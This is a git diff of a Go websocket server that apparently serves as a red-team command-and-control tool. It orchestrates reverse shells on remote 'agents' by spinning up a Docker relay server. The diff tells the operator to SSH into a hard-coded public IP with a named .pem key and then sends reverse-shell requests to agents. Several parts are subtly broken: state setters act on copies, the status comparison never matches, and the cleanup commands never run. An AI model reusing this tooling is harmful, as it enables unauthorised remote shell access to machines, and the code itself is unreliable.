@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -10,20 +11,35 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+	"time"
 
 	"golang.org/x/net/websocket"
 )
 
 type ConnStats struct {
-	auth bool
-	id   string
-	name string
+	auth          bool
+	id            string
+	name          string
+	rsStage       int
+	port          string
+	containerPort string
 }
 
 type Server struct {
 	conns    map[*websocket.Conn]ConnStats
 	secret   string
 	usedPort []string
+}
+
+func (c *ConnStats) setRstage(v int) {
+	c.rsStage = v
+}
+
+func (c *ConnStats) setPort(v string) {
+	c.port = v
+}
+func (c *ConnStats) setContainerPort(v string) {
+	c.containerPort = v
 }
 
 func NewServer() *Server {
@@ -39,6 +55,7 @@ func (s *Server) handleWS(ws *websocket.Conn) {
 	stats.auth = false
 	stats.id = RandomString(6)
 	stats.name = ""
+	stats.rsStage = -1
 	s.conns[ws] = stats
 	s.listenLoop(ws)
 }
@@ -282,7 +299,7 @@ func (s *Server) rsRequest(agentId string, shell string, rserverIp string, rserv
 }
 
 func (s *Server) revSh(agentId string, shell string, rserverIp string, user string, ipSsh string, wsSender *websocket.Conn) {
-	intport := "6655"
+	intport := strconv.Itoa(6000 + rand.Intn(1000))
 	extport := strconv.Itoa(7700 + rand.Intn(100))
 	fmt.Println(extport, s.usedPort)
 	for {
@@ -292,13 +309,30 @@ func (s *Server) revSh(agentId string, shell string, rserverIp string, user stri
 		extport = strconv.Itoa(7700 + rand.Intn(100))
 	}
 	image := "devoxit/rserver:latest"
-	// spin a reverse server
-	err := dockerize(image, extport, intport)
-	if err != true {
-		fmt.Print(err, "dockerization failed")
+	// send command to spin a reverse server
+	cmdStr := "docker run -p " + extport + ":" + intport + " --name rs_" + agentId + " -it " + image + " \"/usr/src/app/rserver tcp " + intport + "\""
+
+	send("please connect here:\n ssh ubuntu@15.168.53.14 -i tm-red-traning-srv1.pem  \""+cmdStr+"\"", wsSender)
+	conn, err := s.getConnById(agentId)
+	if err != nil {
+		fmt.Print(err)
+	}
+	conn.setPort(extport)
+	conn.setContainerPort(intport)
+	conn.setRstage(0) // waiting for container to spin up (user connection)
+	state := s.waitForRServer(agentId)
+	if state != true {
+		fmt.Println("connection timeout ...")
+		send("connection timeout ... !\nPlease retry again ! ", wsSender)
+		s.rsCleanUp(agentId)
 	}
 	s.usedPort = append(s.usedPort, extport)
 	// send to agent order
+	if conn.rsStage != 1 {
+		fmt.Println("Something went wrong ...")
+		send("Something went wrong ... !\nPlease retry again ! ", wsSender)
+		s.rsCleanUp(agentId)
+	}
 	s.rsRequest(agentId, shell, rserverIp, extport, user, ipSsh, wsSender)
 }
 
@@ -348,11 +382,52 @@ func RandomString(n int) string {
 	return string(s)
 }
 
-func dockerize(image string, extport string, intport string) bool {
-	cmd := exec.Command("docker", "container", "run", "-p", extport+":"+intport, "-d", image)
-	err := cmd.Run()
-	if err != nil {
-		return false
+func (s *Server) waitForRServer(agentId string) bool {
+	counter := 0
+	for {
+		if counter%6 == 0 {
+			fmt.Println("Timout in " + strconv.Itoa(5-(counter/6)) + " min ...")
+		}
+		out, _ := exec.Command("docker", "inspect", "-f", "'{{.State.Status}}'", "rs_"+agentId).Output()
+		if string(out) == "running" {
+			conn, err := s.getConnById(agentId)
+			if err != nil {
+				return false
+			}
+			conn.setRstage(1)
+			break
+		}
+		counter++
+		if counter > 30 {
+			return false
+		}
+		time.Sleep(10000 * time.Millisecond)
 	}
+
 	return true
+
+}
+
+func (s *Server) getConnById(id string) (ConnStats, error) {
+	for _, v := range s.conns {
+		if id == v.id {
+			return v, nil
+		}
+	}
+	return ConnStats{}, errors.New("Not found")
+}
+
+func (s *Server) rsCleanUp(agentId string) {
+	conn, err := s.getConnById(agentId)
+	if err != nil {
+		fmt.Println("connection not found")
+		return
+	}
+
+	conn.setRstage(-1)
+	conn.setPort("")
+	conn.setContainerPort("")
+
+	exec.Command("docker", "stop", "rs_"+agentId)
+	exec.Command("docker", "rm", "rs_"+agentId)
 }
